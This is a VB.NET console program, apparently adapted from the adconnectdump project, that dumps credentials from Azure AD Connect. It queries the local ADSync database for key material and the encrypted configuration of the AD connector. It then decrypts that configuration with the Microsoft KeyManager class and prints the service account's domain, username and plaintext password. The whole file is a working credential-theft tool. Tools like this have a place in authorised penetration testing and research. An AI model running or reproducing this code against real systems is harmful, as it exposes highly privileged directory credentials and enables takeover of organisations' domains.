Imports Microsoft.DirectoryServices.MetadirectoryServices.Cryptography
Imports System.Data.SqlClient
Imports System.Xml
Module MainModule

    Sub Main()
        Try
            Console.WriteLine(Environment.NewLine & "======================" & Environment.NewLine &
                              "AZURE AD SYNC CREDENTIAL DECRYPTION TOOL" & Environment.NewLine &
                              "Based on original code from: https://github.com/fox-it/adconnectdump" & Environment.NewLine &
                              "======================" & Environment.NewLine)

            Dim SqlConnectionString As String = "Data Source=(LocalDB)\\.\\ADSync;Initial Catalog=ADSync;Connect Timeout=20"

            If My.Application.CommandLineArgs.Count > 0 AndAlso String.Compare(My.Application.CommandLineArgs(0), "-FullSql", True) = 0 Then
                SqlConnectionString = "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
            End If

            Dim KeyId As UInteger
            Dim InstanceId As Guid
            Dim Entropy As Guid
            Dim ConfigXml As String
            Dim EncryptedPasswordXml As String

            Using SqlConn As New SqlConnection(SqlConnectionString)
                Try
                    Console.WriteLine("Opening database connection...")
                    SqlConn.Open()
                    Using SqlCmd As New SqlCommand("SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;", SqlConn)
                        Console.WriteLine("Executing SQL commands...")
                        Using Reader As SqlDataReader = SqlCmd.ExecuteReader
                            Reader.Read()
                            InstanceId = DirectCast(Reader("instance_id"), Guid)
                            KeyId = CUInt(Reader("keyset_id"))
                            Entropy = DirectCast(Reader("entropy"), Guid)
                        End Using
                    End Using
                    Using SqlCmd As New SqlCommand("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'", SqlConn)
                        Using Reader As SqlDataReader = SqlCmd.ExecuteReader
                            Reader.Read()
                            ConfigXml = CStr(Reader("private_configuration_xml"))
                            EncryptedPasswordXml = CStr(Reader("encrypted_configuration"))
                        End Using
                    End Using
                Catch Ex As Exception
                    Console.WriteLine("Error reading from database: " & Ex.Message)
                    Exit Sub
                Finally
                    Console.WriteLine("Closing database connection...")
                    SqlConn.Close()
                End Try
                Try
                    Console.WriteLine("Decrypting XML...")
                    Dim CryptoManager As New KeyManager
                    CryptoManager.LoadKeySet(Entropy, InstanceId, KeyId)
                    Dim Decryptor As Key = Nothing
                    CryptoManager.GetActiveCredentialKey(Decryptor)
                    Dim PlainTextPasswordXml As String = Nothing
                    Decryptor.DecryptBase64ToString(EncryptedPasswordXml, PlainTextPasswordXml)
                    Console.WriteLine("Parsing XML...")
                    Dim Domain As String = String.Empty
                    Dim Username As String = String.Empty
                    Dim Password As String = String.Empty
                    Dim XmlDoc As New XmlDocument
                    XmlDoc.LoadXml(PlainTextPasswordXml)
                    Dim XmlNav As XPath.XPathNavigator = XmlDoc.CreateNavigator
                    Password = XmlNav.SelectSingleNode("//attribute").Value
                    XmlDoc.LoadXml(ConfigXml)
                    XmlNav = XmlDoc.CreateNavigator
                    Domain = XmlNav.SelectSingleNode("//parameter[@name='forest-login-domain']").Value
                    Username = XmlNav.SelectSingleNode("//parameter[@name='forest-login-user']").Value
                    Console.WriteLine("Finished!" &
                                      Environment.NewLine & Environment.NewLine &
                                      "DECRYPTED CREDENTIALS:" & Environment.NewLine &
                                      "Username: " & Username & Environment.NewLine &
                                      "Password: " & Password & Environment.NewLine &
                                      "Domain: " & Domain & Environment.NewLine)
                Catch ex As Exception
                    Console.WriteLine("Error decrypting: " & ex.Message)
                End Try
            End Using
        Catch ex As Exception
            Console.WriteLine("Unexpected error: " & ex.Message)
        End Try
    End Sub

End Module
